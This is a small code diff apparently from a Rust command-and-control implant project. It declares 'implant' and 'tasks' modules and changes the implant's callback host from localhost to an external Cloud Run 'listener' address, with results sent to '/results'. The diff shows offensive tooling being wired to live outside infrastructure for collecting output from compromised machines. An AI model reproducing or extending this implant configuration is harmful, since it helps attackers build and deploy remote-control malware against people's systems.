@@ -3,8 +3,9 @@ mod implant;
 mod tasks;
 #[tokio::main]
 async fn main() {
-    let host = String::from("localhost");
-    let port = String::from("5000");
+    //http://listener-4uerpljfuq-og.a.run.app
+    let host = String::from("listener-4uerpljfuq-og.a.run.app");
+    let port = String::from("");
     let uri = String::from("/results");
 
     let mut implant = implant::Implant {
